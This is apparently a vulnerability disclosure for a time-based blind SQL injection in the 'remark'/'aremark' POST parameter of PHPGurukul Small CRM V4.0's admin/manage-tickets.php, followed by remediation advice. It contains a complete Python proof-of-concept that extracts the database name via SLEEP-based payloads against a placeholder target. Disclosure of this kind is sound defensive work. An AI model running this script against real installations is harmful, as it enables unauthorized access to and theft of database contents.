# PHPGurukul Small CRM in PHP V4.0 /crm/admin/manage-tickets.php SQL Injectin

## NAME OF AFFECTED PRODUCT(S)

- Small CRM in PHP

## Vendor Homepage

- [Small CRM in PHP](https://phpgurukul.com/small-crm-php/)

## AFFECTED AND/OR FIXED VERSION(S)

### submitter

- YoSheep

### VERSION(S)

- V4.0

### Software Link

- https://phpgurukul.com/?sdm_process_download=1&download_id=10412

## PROBLEM TYPE

### Vulnerability Type

- SQL injection

### Root Cause

* The /crm/admin/manage-tickets.php component remark parameter is directly inserted into SQL statement without proper sanitization or use of prepared statement. Thus, the unsafe practice allows attackers to inject crafted SQL payloads, alerting the intended query logic and executing arbitrary SQL commands in the server.

### Impact

* Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

## DESCRIPTION

* During a security assessment of the *Small CRM in PHP*, a critical SQL injection vulnerability was identified in the /crm/admin/manage-tickets.php file. The flaw arises from insufficient validation of the aremark parameter, which is directly inserted into SQL statement. Exploitation of this flaw allows unauthenticated attackers to inject arbitrary SQL statements, gain access to sensitive data, escalate privileges, and potentially gain control of the application environment. Immediate remediation is strongly advised to mitigate the risk of exploitation.

## Vulnerability Details and Proof of Concept (PoC)

### Vulnerability type:

* Time-based blind SQL injection

### Vulnerability location:

* Parameter: remark (POST)

### Proof of Concept Payloads

```python
import requests
import time

# Target URL (vulnerable endpoint)
URL = "http://TARGET-IP/crm/admin/manage-tickets.php"

# Sleep time used in the injection
SLEEP_TIME = 5
# Maximum expected length of database name
DATABASE_LEN_MAX = 32

def send_payload(payload: str) -> bool:
    """
    Send payload and check if the response time indicates a successful injection.
    Returns True if payload triggered a delay (sleep), otherwise False.
    """
    files = {
        "aremark": (None, payload),
        "update": (None, "update"),
        "frm_id": (None, "7"),
    }
    start = time.time()
    try:
        requests.post(URL, files=files, timeout=SLEEP_TIME + 2)
    except requests.exceptions.Timeout:
        # Timeout indicates SLEEP() executed
        return True
    end = time.time()
    return (end - start) > SLEEP_TIME

def get_dblen() -> int:
    """
    Determine the length of the current database name.
    """
    print("[*] Retrieving database name length...")
    payload_len = "123' AND IF(LENGTH(DATABASE())={}, SLEEP({}), 0) AND '1'='1"
    for i in range(1, DATABASE_LEN_MAX + 1):
        if send_payload(payload_len.format(i, SLEEP_TIME)):
            print(f"[+] Database name length: {i}")
            return i
    return 0

def get_char_at(pos: int) -> str:
    """
    Extract the character at position 'pos' in the database name
    using binary search over ASCII values.
    """
    low, high = 32, 126  # Printable ASCII range
    while low <= high:
        mid = (low + high) // 2
        payload = (
            f"123' AND IF(ASCII(SUBSTRING(DATABASE(),{pos},1))>{mid},0,SLEEP({SLEEP_TIME})) AND '1'='1"
        )
        if send_payload(payload):
            # True branch => character <= mid
            high = mid - 1
        else:
            # False branch => character > mid
            low = mid + 1
    return chr(low)

def get_dbname():
    """
    Extract the full database name character by character.
    """
    db_len = get_dblen()
    if not db_len:
        print("[-] Failed to determine database length")
        return ""

    print("[*] Extracting database name...")
    dbname = ""
    for i in range(1, db_len + 1):
        ch = get_char_at(i)
        dbname += ch
        print(f"[+] Found character {i}: {ch}")
    print(f"[+] Database name extracted: {dbname}")
    return dbname

if __name__ == "__main__":
    get_dbname()
```

Screenshot of excution result:

![image-20250828025704152](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250828025704152.png)

## Suggested Remediation

1. **Use Prepared Statements and Parameterized Queries**

   Implement parameterized queries (mysqli or PDO) to ensure user inputs are treated strictly as data, preventing SQL injection.

2. **Implement Input Validation and Sanitization**

   Validate incoming parameters against expected formats (e.g., numeric IDs). Reject or sanitize unexpected input before processing.

3. **Apply the Principle of Least Privilege**

   Restrict the privileges of the database account used by the application. Avoid using high-privilege accounts (e.g., root).

4. **Conduct Regular Security Audits**

   Periodically review source code and perform penetration testing to identify and remediate potential vulnerabilities.

5. **Upgrade Deprecated Libraries**

   Replace legacy mysql_* functions with mysqli or PDO, which provide better security support and long-term maintainability.